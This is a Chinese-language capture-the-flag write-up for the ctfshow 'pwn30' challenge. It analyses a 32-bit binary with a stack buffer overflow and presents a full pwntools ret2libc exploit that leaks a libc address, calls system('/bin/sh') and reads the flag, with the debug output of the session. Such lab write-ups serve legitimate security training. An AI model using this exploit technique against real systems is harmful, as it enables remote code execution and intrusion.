```
tasike@tasike-VM:~/Desktop$ file pwn30
pwn30: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5075191c7a42c80441a9093274cce03c4225bba6, not stripped
tasike@tasike-VM:~/Desktop$ checksec pwn30
[*] '/home/tasike/Desktop/pwn30'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

32bit，部分开启RELRO，堆栈不可执行

----------

IDA:
```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdin, 0, 1, 0);
  setvbuf(stdout, 0, 2, 0);
  ctfshow(&argc);
  puts(asc_8048710);
  puts(asc_8048784);
  puts(asc_8048800);
  puts(asc_804888C);
  puts(asc_804891C);
  puts(asc_80489A0);
  puts(asc_8048A34);
  puts("    * *************************************                           ");
  puts(aClassifyCtfsho);
  puts("    * Type  : Linux_Security_Mechanisms                               ");
  puts("    * Site  : https://ctf.show/                                       ");
  puts("    * Hint  : No Canary found & No PIE ");
  puts("    * *************************************                           ");
  write(0, "Hello CTFshow!\n", 0xEu);
  return 0;
}
```

通过查看函数，没有发现如system或者exec的系统级函数。

Shift F12查看字符串，没有特殊的如'/bin/sh'的字符串。

5行跟进：

```c
ssize_t ctfshow()
{
  char buf[132]; // [esp+0h] [ebp-88h] BYREF

  return read(0, buf, 0x100u);
}
```

明显有栈溢出漏洞。

因此考虑利用==ret2llibc==

查看plt表：
```
tasike@tasike-VM:~/Desktop$ objdump -d -j .plt pwn30

pwn30:     file format elf32-i386


Disassembly of section .plt:

08048370 <.plt>:
 8048370:	ff 35 04 a0 04 08    	push   0x804a004
 8048376:	ff 25 08 a0 04 08    	jmp    *0x804a008
 804837c:	00 00                	add    %al,(%eax)
	...

08048380 <read@plt>:
 8048380:	ff 25 0c a0 04 08    	jmp    *0x804a00c
 8048386:	68 00 00 00 00       	push   $0x0
 804838b:	e9 e0 ff ff ff       	jmp    8048370 <.plt>

08048390 <puts@plt>:
 8048390:	ff 25 10 a0 04 08    	jmp    *0x804a010
 8048396:	68 08 00 00 00       	push   $0x8
 804839b:	e9 d0 ff ff ff       	jmp    8048370 <.plt>

080483a0 <__libc_start_main@plt>:
 80483a0:	ff 25 14 a0 04 08    	jmp    *0x804a014
 80483a6:	68 10 00 00 00       	push   $0x10
 80483ab:	e9 c0 ff ff ff       	jmp    8048370 <.plt>

080483b0 <write@plt>:
 80483b0:	ff 25 18 a0 04 08    	jmp    *0x804a018
 80483b6:	68 18 00 00 00       	push   $0x18
 80483bb:	e9 b0 ff ff ff       	jmp    8048370 <.plt>

080483c0 <setvbuf@plt>:
 80483c0:	ff 25 1c a0 04 08    	jmp    *0x804a01c
 80483c6:	68 20 00 00 00       	push   $0x20
 80483cb:	e9 a0 ff ff ff       	jmp    8048370 <.plt>

```

编写exp

```python
from pwn import *
from LibcSearcher import *
context(os = 'Linux', arch = 'i386', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28203)
elf = ELF('./pwn30')
ctfshow = elf.sym['ctfshow']

payload1 = cyclic(140) + p32(elf.sym['write']) + p32(ctfshow) + p32(1) + p32(elf.got['write']) + p32(4)  # 这里的p32(1)和p32(4)是有说法的，我用0不行会超时
r.sendline(payload1)

write = u32(r.recv(4))
print(hex(write))

libc = LibcSearcher('write', write)
libc_base = write - libc.dump('write')
system = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')

payload2 = cyclic(140) + p32(system) + p32(ctfshow) + p32(bin_sh)
r.sendline(payload2)

r.interactive()
```

通关成功：
```
tasike@tasike-VM:~/Desktop$ python3 exp.py
[+] Opening connection to pwn.challenge.ctf.show on port 28203: Done
[*] '/home/tasike/Desktop/pwn30'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[DEBUG] Sent 0xa1 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│
    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
    00000040  71 61 61 61  72 61 61 61  73 61 61 61  74 61 61 61  │qaaa│raaa│saaa│taaa│
    00000050  75 61 61 61  76 61 61 61  77 61 61 61  78 61 61 61  │uaaa│vaaa│waaa│xaaa│
    00000060  79 61 61 61  7a 61 61 62  62 61 61 62  63 61 61 62  │yaaa│zaab│baab│caab│
    00000070  64 61 61 62  65 61 61 62  66 61 61 62  67 61 61 62  │daab│eaab│faab│gaab│
    00000080  68 61 61 62  69 61 61 62  6a 61 61 62  b0 83 04 08  │haab│iaab│jaab│····│
    00000090  f6 84 04 08  01 00 00 00  18 a0 04 08  04 00 00 00  │····│····│····│····│
    000000a0  0a                                                  │·│
    000000a1
[DEBUG] Received 0x4 bytes:
    00000000  f0 46 eb f7                                         │·F··│
    00000004
0xf7eb46f0
[+] There are multiple libc that meet current constraints :
0 - libc6_2.19-0ubuntu6_amd64
1 - libc6_2.19-0ubuntu4_amd64
2 - libc6_2.19-0ubuntu3_amd64
3 - libc6_2.19-0ubuntu5_amd64
4 - libc-2.36-22.mga9.x86_64
5 - libc6-i386_2.27-3ubuntu1_amd64
6 - libc6_2.17-93ubuntu2_amd64
7 - libc6-i386_2.27-3ubuntu1.3_amd64
8 - libc6-i386_2.27-3ubuntu1.4_amd64
9 - libc6_2.17-93ubuntu4_amd64
[+] Choose one : 5
[DEBUG] Sent 0x99 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│
    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
    00000040  71 61 61 61  72 61 61 61  73 61 61 61  74 61 61 61  │qaaa│raaa│saaa│taaa│
    00000050  75 61 61 61  76 61 61 61  77 61 61 61  78 61 61 61  │uaaa│vaaa│waaa│xaaa│
    00000060  79 61 61 61  7a 61 61 62  62 61 61 62  63 61 61 62  │yaaa│zaab│baab│caab│
    00000070  64 61 61 62  65 61 61 62  66 61 61 62  67 61 61 62  │daab│eaab│faab│gaab│
    00000080  68 61 61 62  69 61 61 62  6a 61 61 62  10 bd e0 f7  │haab│iaab│jaab│····│
    00000090  f6 84 04 08  cf a8 f4 f7  0a                        │····│····│·│
    00000099
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x64 bytes:
    b'bin\n'
    b'boot\n'
    b'dev\n'
    b'etc\n'
    b'flag\n'
    b'home\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'media\n'
    b'mnt\n'
    b'opt\n'
    b'proc\n'
    b'pwn\n'
    b'root\n'
    b'run\n'
    b'sbin\n'
    b'srv\n'
    b'sys\n'
    b'tmp\n'
    b'usr\n'
    b'var\n'
bin
boot
dev
etc
flag
home
lib
lib32
lib64
media
mnt
opt
proc
pwn
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x2e bytes:
    b'ctfshow{134cc38f-fdee-40a4-8920-39db475a8d5b}\n'
ctfshow{134cc38f-fdee-40a4-8920-39db475a8d5b}
$ 
[*] Interrupted
[*] Closed connection to pwn.challenge.ctf.show port 28203

```



